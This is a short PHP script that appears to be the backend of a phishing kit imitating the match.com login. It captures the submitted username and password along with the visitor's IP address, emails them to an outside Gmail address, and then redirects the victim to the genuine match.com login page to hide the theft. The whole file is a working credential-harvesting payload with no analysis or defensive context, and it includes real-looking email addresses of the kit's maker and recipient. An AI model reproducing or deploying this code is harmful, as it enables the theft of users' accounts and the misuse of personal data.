<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------+ match by protest_song(at)yahoo.com +-----------------\n";
$message .= "user : ".$_POST['handle']."\n";
$message .= "pass : ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------+ match by protest_song(at)yahoo.com +-----------------\n";
$send = "jamiejames373@gmail.com";
$subject = "match | $ip";
mail("$send", "$subject", $message); 
header("Location: https://secure.match.com/login/index/?#/");
?>